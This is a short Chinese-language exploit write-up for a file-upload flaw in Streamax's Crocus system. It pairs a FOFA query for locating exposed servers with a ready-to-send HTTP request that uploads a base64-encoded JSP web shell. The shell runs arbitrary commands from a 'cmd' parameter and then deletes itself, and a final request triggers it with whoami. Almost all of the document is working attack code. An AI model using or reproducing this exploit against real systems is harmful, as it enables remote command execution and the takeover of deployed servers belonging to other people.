# 深圳市锐明技术股份有限公司Crocus系统RepairRecord.do文件上传

## fofa
```
body="/ThirdResource/respond/respond.min.js" && title="Crocus"
```

## poc
```javascript
POST /RepairRecord.do?Action=imageupload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

{
  "username": "streamax20020818",
  "license": "1",
  "chnnel": 1,
  "type": 1,
  "imsage": "PCUgamF2YS5pby5JbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKS5nZXRJbnB1dFN0cmVhbSgpO2ludCBhID0gLTE7Ynl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTtvdXQucHJpbnQoIjxwcmU+Iik7d2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXtvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIsMCxhKSk7fW91dC5wcmludCgiPC9wcmU+Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==",
  "picturename": "a.jsp"
}
```
访问地址
```
GET /SystemFile/PictureRecord/imageupload/a.jsp?cmd=whoami HTTP/1.1
Host:
```
